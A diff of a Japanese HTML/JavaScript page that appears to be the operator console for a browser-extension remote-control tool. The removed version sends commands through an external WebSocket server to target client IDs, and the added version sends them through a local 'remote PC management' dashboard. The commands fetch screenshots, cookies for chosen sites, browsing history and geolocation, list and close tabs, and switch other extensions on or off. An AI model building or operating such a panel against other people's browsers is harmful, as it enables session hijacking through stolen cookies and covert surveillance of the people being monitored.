@@ -1,299 +1,224 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WebSocket クライアント</title>
+  <title>リモートPC管理ダッシュボード</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      max-width: 600px;
-      margin: auto;
-    }
-    #messages {
-      border: 1px solid #ccc;
-      padding: 10px;
-      height: 300px;
-      overflow-y: scroll;
-      background: #f9f9f9;
-      margin-bottom: 20px;
-    }
-    #canvasContainer {
-      margin-top: 20px;
-      text-align: center;
-    }
-    canvas {
-      border: 1px solid #ccc;
-      background-color: #eef;
-      margin: auto;
-      display: block;
-      max-width: 100%;
-      margin-top: 10px;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-    }
-    input {
-      width: 100%;
-      padding: 8px;
-      box-sizing: border-box;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #007BFF;
-      color: white;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:disabled {
-      background-color: #ccc;
-      cursor: not-allowed;
-    }
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    #output { border: 1px solid #ccc; padding: 10px; height: 250px; overflow-y: scroll; background-color: #f8f8f8; white-space: pre-wrap; }
+    .section { border: 1px solid #ddd; padding: 10px; margin-bottom: 20px; }
+    .item { margin-bottom: 5px; }
   </style>
 </head>
 <body>
-  <h2>WebSocket クライアント</h2>
-<!-- HTML: <input>にdatalistを関連付け -->
-<div class="form-group">
-  <label for="clientId">自分のIDを入力してください:</label>
-  <input type="text" id="clientId" list="savedIds" placeholder="例: myClient123" />
-  <datalist id="savedIds"></datalist>
-  <button id="connectButton">接続</button>
-</div>
+  <h1>リモートPC管理ダッシュボード</h1>
+  
+  <div class="section">
+    <h2>スクリーンショット制御</h2>
+    <button id="startScreenshot">スクリーンショット取得開始 (ON)</button>
+    <button id="stopScreenshot">スクリーンショット取得停止 (OFF)</button>
+  </div>
 
-  <div id="sendMessageForm" style="display: none;">
-<div class="form-group">
-  <label for="targetId">送信先のID:</label>
-  <input type="text" id="targetId" list="savedTargetIds" placeholder="送信先のクライアントIDを入力" />
-  <datalist id="savedTargetIds"></datalist>
-</div>
+  <div class="section">
+    <h2>指定URLを開く</h2>
+    <input type="text" id="urlInput" placeholder="URLを入力" style="width:300px;">
+    <select id="openMode">
+      <option value="tab">タブで開く</option>
+      <option value="window">ウィンドウで開く</option>
+    </select>
+    <input type="number" id="widthInput" placeholder="幅 (ウィンドウ)" style="width:80px;">
+    <input type="number" id="heightInput" placeholder="高さ (ウィンドウ)" style="width:80px;">
+    <button id="openURL">開く</button>
+  </div>
 
-    <div class="form-group">
-      <label for="messageContent">送信するメッセージ:</label>
-      <input type="text" id="messageContent" placeholder="送信する内容を入力" />
-    </div>
-    <button id="sendButton">メッセージ送信</button>
+  <div class="section">
+    <h2>ウィンドウ/タブ管理</h2>
+    <button id="listWindows">ウィンドウ・タブ一覧取得</button>
+    <div id="windowsList"></div>
   </div>
-  <div id="commandButtons" style="margin-top: 20px;">
-    <h3>コマンドのプリセット</h3>
-    <div class="form-group">
-      <label for="customUrl">URLまたはIDを入力:</label>
-      <input type="text" id="customUrl" placeholder="例: https://example.com または extensionID" />
-    </div>
-    <button class="preset-command" data-command="screenshot">スクリーンショットを取得</button>
-    <button class="preset-command" data-command="getLocations">位置情報を取得</button>
-    <button class="preset-command" data-command="extensionEnable">拡張機能を有効化</button>
-    <button class="preset-command" data-command="extensionDisable">拡張機能を無効化</button>
-    <button class="preset-command" data-command="GetExtensionId">拡張機能のIDを取得</button>
-    <button class="preset-command" data-command="GetHistory">履歴を取得</button>
-    <button class="preset-command" data-command="getCookie">指定URLのCookieを取得</button>
-    <div>
-      <label for="openOptions">新しいページを開く設定:</label>
-      <input type="text" id="openOptions" placeholder="例: true 1024 768" />
-    </div>
-    <button class="preset-command" data-command="openPage">新しいページを開く</button>
-    <button class="preset-command" data-command="closePage">指定ページを閉じる</button>
-    <button class="preset-command" data-command="getPage">現在のタブ情報を取得</button>
+
+  <div class="section">
+    <h2>拡張機能管理</h2>
+    <button id="listExtensions">拡張機能一覧取得</button>
+    <div id="extensionsList"></div>
   </div>
-  <h3>受信したメッセージ:</h3>
-  <div id="messages"></div>
-  <div id="canvasContainer">
-    <h3>受信した画像:</h3>
-    <canvas id="imageCanvas"></canvas>
+
+  <div class="section">
+    <h2>位置情報取得</h2>
+    <button id="openGeo">位置情報ウィンドウを開く</button>
   </div>
+
+  <div class="section">
+    <h2>Cookie取得</h2>
+    <input type="text" id="cookieUrl" placeholder="Cookie取得対象のURL" style="width:300px;">
+    <button id="getCookies">Cookie取得</button>
+  </div>
+
+  <div class="section">
+    <h2>ログ出力</h2>
+    <pre id="output"></pre>
+  </div>
+
   <script>
-    let ws;
-    let clientId;
-    const canvas = document.getElementById('imageCanvas');
-    const ctx = canvas.getContext('2d');
+    const output = document.getElementById('output');
 
-// ページ読み込み時にID候補を生成
-window.addEventListener('DOMContentLoaded', () => {
-  const savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
-  populateTargetIdDatalist(savedTargetIds);
+    // WebSocket接続 (現在のホストと同じポート3000を利用)
+    const ws = new WebSocket("ws://" + location.host);
 
-  const savedClientId = localStorage.getItem('clientId');
-  const savedTargetId = localStorage.getItem('targetId');
-  if (savedClientId) document.getElementById('clientId').value = savedClientId;
-  if (savedTargetId) document.getElementById('targetId').value = savedTargetId;
-});
-// 接続ボタンのクリックイベント
-document.getElementById('connectButton').addEventListener('click', function () {
-  const inputField = document.getElementById('clientId');
-  clientId = inputField.value.trim();
-  if (!clientId) return alert('IDを入力してください。');
-  
-  // IDを保存
-  saveIdToLocalStorage(clientId);
+    ws.onopen = () => {
+      appendLog("WSサーバに接続しました。");
+    };
 
-  localStorage.setItem('clientId', clientId);
-  initWebSocket(clientId);
-  inputField.disabled = true;
-  this.disabled = true;
-  document.getElementById('sendMessageForm').style.display = 'block';
-});
-
-      // IDを保存する関数
-function saveIdToLocalStorage(newId) {
-  let savedIds = JSON.parse(localStorage.getItem('savedIds')) || [];
-  if (!savedIds.includes(newId)) {
-    savedIds.push(newId);
-    localStorage.setItem('savedIds', JSON.stringify(savedIds));
-    populateIdDatalist(savedIds); // 候補リストを更新
-  }
-}
-
-// 候補リストを生成する関数
-function populateIdDatalist(ids) {
-  const datalist = document.getElementById('savedIds');
-  datalist.innerHTML = ''; // リストをクリア
-  ids.forEach(id => {
-    const option = document.createElement('option');
-    option.value = id;
-    datalist.appendChild(option);
-  });
-}
-
-    // WebSocketの初期化
-    function initWebSocket(clientId) {
-      const SERVER_URL = 'wss://ws.psannetwork.net/';
-      ws = new WebSocket(SERVER_URL);
-      ws.onopen = () => {
-        appendMessage('サーバーに接続しました');
-        ws.send(JSON.stringify({ id: clientId }));
-      };
-      ws.onmessage = (event) => handleMessage(event.data);
-      ws.onerror = (error) => appendMessage('接続エラー: ' + error.message);
-      ws.onclose = () => setTimeout(() => initWebSocket(clientId), 5000);
-    }
-
-    // メッセージの処理
-    function handleMessage(data) {
+    ws.onmessage = (event) => {
+      let msg;
       try {
-        const message = JSON.parse(data);
-        if (message.message.startsWith('data:image/png;base64,')) {
-          appendMessage(`画像メッセージ受信: ${message.from}`);
-          drawImageOnCanvas(message.message);
-        } else {
-          appendMessage(`メッセージ受信: ${message.message}`);
-        }
-      } catch {
-        appendMessage('メッセージの解析に失敗しました: ' + data);
+        msg = JSON.parse(event.data);
+      } catch (e) {
+        appendLog("受信データ解析エラー:" + e);
+        return;
       }
+      if (msg.command === "listWindowsResponse") {
+        displayWindows(msg.data);
+      } else if (msg.command === "cookiesResponse") {
+        appendLog("Cookie情報:\n" + JSON.stringify(msg.data, null, 2));
+      } else if (msg.command === "extensionsResponse") {
+        displayExtensions(msg.data);
+      } else if (msg.command === "screenshot") {
+        // スクリーンショット受信例（dataURLの長さを表示）
+        appendLog("スクリーンショット受信, 長さ:" + msg.data.length);
+      } else {
+        appendLog("受信:" + event.data);
+      }
+    };
+
+    ws.onerror = (error) => {
+      appendLog("WSエラー:" + error);
+    };
+
+    ws.onclose = () => {
+      appendLog("WS接続が切断されました。");
+    };
+
+    function appendLog(message) {
+      output.textContent += message + "\n";
+      output.scrollTop = output.scrollHeight;
     }
 
-    // メッセージの表示
-    function appendMessage(msg) {
-      const messagesDiv = document.getElementById('messages');
-      const newMessage = document.createElement('div');
-      newMessage.textContent = msg;
-      messagesDiv.appendChild(newMessage);
-      messagesDiv.scrollTop = messagesDiv.scrollHeight;
-    }
-
-    // キャンバスに画像を描画
-    function drawImageOnCanvas(base64Image) {
-      const img = new Image();
-      img.onload = () => {
-        const maxWidth = window.innerWidth * 0.8;
-        const maxHeight = window.innerHeight * 0.6;
-        const scale = Math.min(maxWidth / img.width, maxHeight / img.height);
-        canvas.width = img.width * scale;
-        canvas.height = img.height * scale;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-      };
-      img.src = base64Image;
-    }
-
-    // メッセージ送信ボタンのイベント
-document.getElementById('sendButton').addEventListener('click', () => {
-  const targetId = document.getElementById('targetId').value.trim();
-  const messageContent = document.getElementById('messageContent').value.trim();
-  if (!targetId || !messageContent) return alert('送信先IDとメッセージを入力してください。');
-  
-  // 送信先IDを保存
-  saveTargetIdToLocalStorage(targetId);
-
-  localStorage.setItem('targetId', targetId);
-  sendWebSocketMessage({ type: 'cmd', message: messageContent, to: targetId, from: clientId });
-  appendMessage(`送信済み: to=${targetId}, message=${messageContent}`);
-});
-
-
-      function populateTargetIdDatalist(targetIds) {
-  const datalist = document.getElementById('savedTargetIds');
-  datalist.innerHTML = ''; // リストをクリア
-  targetIds.forEach(id => {
-    const option = document.createElement('option');
-    option.value = id;
-    datalist.appendChild(option);
-  });
-}
-      function saveTargetIdToLocalStorage(newTargetId) {
-  let savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
-  if (!savedTargetIds.includes(newTargetId)) {
-    savedTargetIds.push(newTargetId);
-    localStorage.setItem('savedTargetIds', JSON.stringify(savedTargetIds));
-    populateTargetIdDatalist(savedTargetIds); // 候補リストを更新
-  }
-}
-    // プリセットコマンドボタンのイベント
-    document.querySelectorAll('.preset-command').forEach(button => {
-      button.addEventListener('click', () => {
-        const targetId = document.getElementById('targetId').value.trim();
-        const commandType = button.dataset.command;
-        const input = document.getElementById('customUrl').value.trim();
-        const openOptions = document.getElementById('openOptions').value.trim();
-
-        if (!targetId) return alert('送信先IDを入力してください。');
-        localStorage.setItem('targetId', targetId);
-
-        let command = generateCommand(commandType, input, openOptions);
-        if (command) {
-          sendWebSocketMessage({ type: 'cmd', message: command, to: targetId, from: clientId });
-          appendMessage(`送信済み: to=${targetId}, command=${command}`);
-        }
-      });
+    // 各ボタンのイベントハンドラ
+    document.getElementById('startScreenshot').addEventListener('click', () => {
+      ws.send(JSON.stringify({ command: "startScreenshot" }));
+      appendLog("コマンド送信: startScreenshot");
     });
 
-    // WebSocketでメッセージを送信する
-    function sendWebSocketMessage(message) {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(message));
-      } else {
-        appendMessage('接続が確立されていません。');
-      }
+    document.getElementById('stopScreenshot').addEventListener('click', () => {
+      ws.send(JSON.stringify({ command: "stopScreenshot" }));
+      appendLog("コマンド送信: stopScreenshot");
+    });
+
+    document.getElementById('openURL').addEventListener('click', () => {
+      const url = document.getElementById('urlInput').value;
+      const mode = document.getElementById('openMode').value;
+      const width = parseInt(document.getElementById('widthInput').value) || undefined;
+      const height = parseInt(document.getElementById('heightInput').value) || undefined;
+      ws.send(JSON.stringify({ command: "openURL", data: { url, mode, width, height } }));
+      appendLog(`コマンド送信: openURL (${url})`);
+    });
+
+    document.getElementById('listWindows').addEventListener('click', () => {
+      ws.send(JSON.stringify({ command: "listWindows" }));
+      appendLog("コマンド送信: listWindows");
+    });
+
+    document.getElementById('listExtensions').addEventListener('click', () => {
+      ws.send(JSON.stringify({ command: "getExtensions" }));
+      appendLog("コマンド送信: getExtensions");
+    });
+
+    document.getElementById('openGeo').addEventListener('click', () => {
+      ws.send(JSON.stringify({ command: "openGeo" }));
+      appendLog("コマンド送信: openGeo");
+    });
+
+    document.getElementById('getCookies').addEventListener('click', () => {
+      const url = document.getElementById('cookieUrl').value;
+      ws.send(JSON.stringify({ command: "getCookies", data: { url } }));
+      appendLog(`コマンド送信: getCookies (${url})`);
+    });
+
+    // ウィンドウ・タブ一覧の表示
+    function displayWindows(windows) {
+      const listDiv = document.getElementById('windowsList');
+      listDiv.innerHTML = "";
+      windows.forEach(win => {
+        const winDiv = document.createElement('div');
+        winDiv.style.border = "1px solid #aaa";
+        winDiv.style.margin = "5px";
+        winDiv.style.padding = "5px";
+        winDiv.innerHTML = `<strong>ウィンドウID: ${win.id}</strong> (状態: ${win.state}, フォーカス: ${win.focused})<br>タブ一覧:<br>`;
+        win.tabs.forEach(tab => {
+          const tabDiv = document.createElement('div');
+          tabDiv.style.marginLeft = "20px";
+          tabDiv.className = "item";
+          tabDiv.innerHTML = `タブID: ${tab.id} | タイトル: ${tab.title} | URL: ${tab.url} 
+            <button data-tabid="${tab.id}">閉じる</button>`;
+          tabDiv.querySelector("button").addEventListener('click', (e) => {
+            const tabId = e.target.getAttribute("data-tabid");
+            ws.send(JSON.stringify({ command: "closeTab", data: { tabId: Number(tabId) } }));
+            appendLog("コマンド送信: closeTab (" + tabId + ")");
+          });
+          winDiv.appendChild(tabDiv);
+        });
+        // ウィンドウサイズ変更フォーム
+        const resizeForm = document.createElement('div');
+        resizeForm.style.marginLeft = "20px";
+        resizeForm.innerHTML = `
+          <input type="number" placeholder="幅" id="win-width-${win.id}" style="width:80px;">
+          <input type="number" placeholder="高さ" id="win-height-${win.id}" style="width:80px;">
+          <button id="resize-${win.id}">ウィンドウリサイズ(${win.id})</button>
+        `;
+        winDiv.appendChild(resizeForm);
+        winDiv.querySelector(`#resize-${win.id}`).addEventListener('click', () => {
+          const width = parseInt(document.getElementById(`win-width-${win.id}`).value);
+          const height = parseInt(document.getElementById(`win-height-${win.id}`).value);
+          if (width && height) {
+            ws.send(JSON.stringify({ command: "resizeWindow", data: { windowId: win.id, width, height } }));
+            appendLog("コマンド送信: resizeWindow (" + win.id + ")");
+          }
+        });
+        listDiv.appendChild(winDiv);
+      });
     }
 
-function generateCommand(commandType, input, openOptions) {
-  switch (commandType) {
-    case 'getCookie':  // Fixed: Corrected from 'GetCookies' to 'getCookie'
-      if (!input) return alert('URLを入力してください。');  // Ensure the URL is provided
-      return `${commandType} ${input}`;  // Properly format the command with URL
-    case 'screenshot':
-    case 'extensionEnable':
-    case 'extensionDisable':
-      if (!input) return alert('IDまたはURLを入力してください。');
-      return `${commandType} ${input}`;
-    case 'openPage':
-      if (!input || !openOptions) return alert('URLとオプションを入力してください。');
-      return `${commandType} ${input} ${openOptions}`;
-    case 'closePage':
-      if (!input) return alert('URLを入力してください。');
-      return `${commandType} ${input}`;
-    default:
-      return commandType;
-  }
-}
-
+    // 拡張機能一覧の表示とON/OFF操作
+    function displayExtensions(extensions) {
+      const extDiv = document.getElementById('extensionsList');
+      extDiv.innerHTML = "";
+      extensions.forEach(ext => {
+        // 除外する自身の拡張機能もリストに含まれる場合があるため、除外するなどの対応も可能です
+        const item = document.createElement('div');
+        item.className = "item";
+        item.style.borderBottom = "1px solid #ccc";
+        item.style.padding = "5px";
+        item.innerHTML = `ID: ${ext.id} | 名前: ${ext.name} | 状態: ${ext.enabled ? "有効" : "無効"}`;
+        const btn = document.createElement('button');
+        btn.style.marginLeft = "10px";
+        if (ext.enabled) {
+          btn.textContent = "無効化";
+          btn.addEventListener('click', () => {
+            ws.send(JSON.stringify({ command: "disableExtension", data: { id: ext.id } }));
+            appendLog("コマンド送信: disableExtension (" + ext.id + ")");
+          });
+        } else {
+          btn.textContent = "有効化";
+          btn.addEventListener('click', () => {
+            ws.send(JSON.stringify({ command: "enableExtension", data: { id: ext.id } }));
+            appendLog("コマンド送信: enableExtension (" + ext.id + ")");
+          });
+        }
+        item.appendChild(btn);
+        extDiv.appendChild(item);
+      });
+    }
   </script>
 </body>
 </html>
